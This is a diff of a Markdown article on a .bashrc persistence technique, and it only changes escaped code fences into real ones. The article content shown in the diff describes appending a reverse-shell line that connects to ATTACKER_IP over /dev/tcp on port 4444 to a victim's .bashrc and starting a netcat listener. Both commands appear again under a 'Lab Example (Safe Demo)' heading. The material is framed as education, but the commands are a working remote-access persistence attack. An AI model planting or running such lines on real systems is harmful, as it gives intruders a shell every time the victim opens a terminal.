@@ -51,18 +51,18 @@ The attacker first compromises the system (via exploit, weak creds, phishing, et
 ### ✅ Step 2: Payload Injection  
 They append a reverse shell payload to the target user’s `.bashrc`:  
 
-\`\`\`bash
+```bash
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /home/alice/.bashrc
-\`\`\`
+```
 
 Every time **Alice** opens a terminal, the reverse shell fires.  
 
 ### ✅ Step 3: Listener Setup  
 On the attacker’s machine:  
 
-\`\`\`bash
+```bash
 nc -lvnp 4444
-\`\`\`
+```
 
 Netcat listens for incoming connections.  
 
@@ -99,15 +99,15 @@ For sysadmins or developers who open terminals all day, this trick is especially
 ## 🧪 Lab Example (Safe Demo)
 
 **On attacker machine:**  
-\`\`\`bash
+```bash
 nc -lvnp 4444
-\`\`\`
+```
 
 **On target machine:**  
-\`\`\`bash
+```bash
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc
 bash
-\`\`\`
+```
 
 ➡️ Reverse shell pops to the attacker as soon as the victim starts Bash.  
 
